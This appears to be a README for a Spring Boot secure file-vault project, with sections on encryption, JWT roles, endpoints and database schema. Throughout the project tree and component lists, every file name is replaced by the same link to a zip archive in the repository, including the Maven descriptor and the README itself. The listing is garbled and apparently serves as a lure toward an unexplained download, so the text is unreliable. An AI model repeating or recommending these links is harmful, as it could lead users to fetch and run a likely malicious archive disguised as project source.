Ironclad Secure Vault Management System

📌 Project Overview

Ironclad Vault Management System is a secure, encrypted file storage and management application built using Spring Boot and Java.
The system allows users to upload, download, delete, and search files, with role-based access and audit logging for security and transparency.
   
Purpose
The primary goal is to create a centralized, secure vault system for storing sensitive files.
It ensures:
Data Security and Privacy: Encrypts files using AES-256 and stores user credentials securely with BCrypt hashing.
Controlled Access: Role-based access control ensures only authorized personnel can view, download, or delete files.
Accountability and Auditability: Maintains detailed audit logs of every file operation for transparency and traceability.
Ease of Use: Provides a simple interface for performing file operations with minimal technical complexity.
Ironclad Vault Management System is ideal for organizations, institutions, and individuals handling confidential documents like financial records, legal contracts, certificates, and personal data.
It exists in the real world as a solution for:
Secure storage of sensitive digital assets
Controlled access to confidential files   
Transparent operational audit trails
Foundation for enterprise-grade document management systems  

🏗️ Project Structure

```text
IroncladVaultManagementSystem/
├── src/
│   ├── main/
│   │   ├── java/
│   │   │   └── com/java/IroncladVaultManagementSystem/
│   │   │       ├── config/
│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       ├── controller/
│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       ├── dto/
│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       ├── model/
│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       ├── repository/
│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       ├── service/
│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   │       └── util/
│   │   │           └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │   └── resources/
│   │       ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│   │       ├── static/        # Static resources (css, js, images)
│   │       └── templates/     # Thymeleaf HTML templates
│   └── test/
│       └── java/
│           └── com/java/IroncladVaultManagementSystem/
│               ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
│               └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
├── vault_storage/               # Folder to store encrypted files
├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip                      # Maven project descriptor
└── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip                    # Project documentation
```

🛠️ Technology Stack
Java 17+ – Provides a modern, robust, and high-performance foundation for building secure and scalable backend applications.
Spring Boot 3.x – Simplifies application setup and configuration, enabling rapid development of production-ready REST APIs.
Spring Data JPA – Handles database operations efficiently using object-relational mapping (ORM), reducing boilerplate SQL code.
Spring Security with JWT – Ensures secure authentication and authorization through stateless, token-based user sessions.
AES-256 Encryption – Protects sensitive files and data by providing advanced encryption for secure storage and transmission.
MySQL Database – Stores and manages application data reliably with strong relational integrity and scalability.
Maven – Manages project dependencies, builds, and configurations for easy integration and version control.
REST API – Enables seamless communication between client and server through standardized, stateless endpoints.

🔗 REST API Endpoints
| Endpoint                 | Method | Description                            |
| ------------------------ | ------ | -------------------------------------- |
| /api/v1.0/users/register | POST   | Register a new user                    |
| /api/v1.0/users/login    | POST   | Authenticate user and return JWT token |


Vault Management
| Endpoint                      | Method | Description                      |
| ----------------------------- | ------ | -------------------------------- |
| /vault/upload                 | POST   | Upload a new file (encrypted)    |
| /vault/files                  | GET    | List files (role-based access)   |
| /vault/download/{filename}    | GET    | Download a file (decrypted)      |
| /vault/delete/{filename}      | DELETE | Delete a file (admin only)       |
| /vault/search?name={filename} | GET    | Search files by name             |
| /vault/audit-logs             | GET    | Retrieve audit logs (admin only) |


Audit Logs
| Endpoint    | Method | Description                                   |
| ----------- | ------ | --------------------------------------------- |
| /audit-logs | GET    | List all audit logs (for admins and managers) |


🔐 Security and Authentication
JWT Authentication: Ensures secure user login and role-based access
Password Hashing: Passwords stored securely using BCrypt
File Encryption: All uploaded files are encrypted with AES-256 before storage

Roles and Permissions
| Role    | Upload | View All Files | Download  | Delete | Search    | View Audit Logs |
| ------- | ------ | -------------- | --------- | ------ | --------- | --------------- |
| ADMIN   | Yes    | Yes            | Yes       | Yes    | Yes       | Yes             |
| MANAGER | Yes    | Yes (all)      | Yes       | No     | Yes       | No              |
| USER    | Yes    | Yes (own)      | Yes (own) | No     | Yes (own) | Yes (own)       |


Audit Logging: Tracks all file operations (UPLOAD, DOWNLOAD, DELETE) for accountability.

💾 Database Schema

User Table
Purpose: Stores information about all registered users of the system.
| Column       | Description                 |
| ------------ | --------------------------- |
| id           | UUID Primary Key            |
| username     | Unique username             |
| passwordHash | BCrypt hashed password      |
| role         | Role (ADMIN, MANAGER, USER) |


FileEntity Table
Purpose: Stores metadata about files uploaded to the secure vault.
| Column    | Description                    |
| --------- | ------------------------------ |
| id        | UUID Primary Key               |
| filename  | Original file name             |
| filepath  | Storage path of encrypted file |
| owner_id  | Foreign key referencing User   |
| createdAt | Timestamp                      |

AuditLog Table
Purpose: Tracks all actions performed in the system for transparency and accountability.
| Column    | Description                   |
| --------- | ----------------------------- |
| id        | UUID Primary Key              |
| user_id   | User who performed the action |
| action    | UPLOAD / DOWNLOAD / DELETE    |
| file_id   | File affected                 |
| timestamp | Action timestamp              |


📈 Features

Secure file upload/download with AES encryption
JWT-based authentication and role management
Audit logging of all file actions
Search files by name
Role-based access control
User-friendly REST API design

🧠 How It Works (Internally)
User registers, password is hashed using BCrypt
User logs in, server issues a JWT token
User uploads/downloads files, JWT is validated by JwtRequestFilter
Each action is logged in AuditLog
Role-based security controls access to endpoints dynamically

Repositories (Data Access):
https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Extends JpaRepository; methods for finding users by username.
https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Extends JpaRepository; methods for querying files by owner, name, etc.
https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Extends JpaRepository; methods for querying logs by user.
Services (Business Logic):

https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Handles user auth; implements UserDetailsService, password encoding, user saving/loading.
https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Core file operations; encrypts/decrypts files using AES, manages storage, logs actions.

Config (Security & Utils):
https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Configures Spring Security; disables CSRF, permits auth endpoints, adds JWT filter.
https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip JWT token generation/validation; extracts claims, handles expiration.
https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Intercepts requests; validates JWT, sets authentication context.
https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Bean for BCrypt password encoder.

DTOs (Data Transfer Objects):
https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip For login requests; fields: username, password.
https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip For login responses; fields: token.
https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip For file listings; fields: id, filename, uploadedBy, uploadTime.
Util:

https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Encryption utilities; generates AES keys, encrypts/decrypts data.

🧑‍💻 Roles and Access Control
| Role    | Upload | View All Files | Download  | Delete | Search    | View Audit Logs |
| ------- | ------ | -------------- | --------- | ------ | --------- | --------------- |
| ADMIN   | Yes    | Yes            | Yes       | Yes    | Yes       | Yes             |
| MANAGER | Yes    | Yes (all)      | Yes       | No     | Yes       | No              |
| USER    | Yes    | Yes (own)      | Yes (own) | No     | Yes (own) | Yes (own)       |

🧰 API Endpoints Summary

User Authentication
| Method | Endpoint                 | Description                    |
| ------ | ------------------------ | ------------------------------ |
| POST   | /api/v1.0/users/register | Register a new user            |
| POST   | /api/v1.0/users/login    | Authenticate and get JWT token |


File Operations
| Method | Endpoint                      | Description              |
| ------ | ----------------------------- | ------------------------ |
| POST   | /vault/upload                 | Upload a file            |
| GET    | /vault/files                  | List available files     |
| GET    | /vault/download/{filename}    | Download a specific file |
| DELETE | /vault/delete/{filename}      | Delete file (Admin only) |
| GET    | /vault/search?name={filename} | Search file by name      |


Audit Logs
| Method | Endpoint          | Description                            |
| ------ | ----------------- | -------------------------------------- |
| GET    | /vault/audit-logs | View audit trail (Admin/User-specific) |

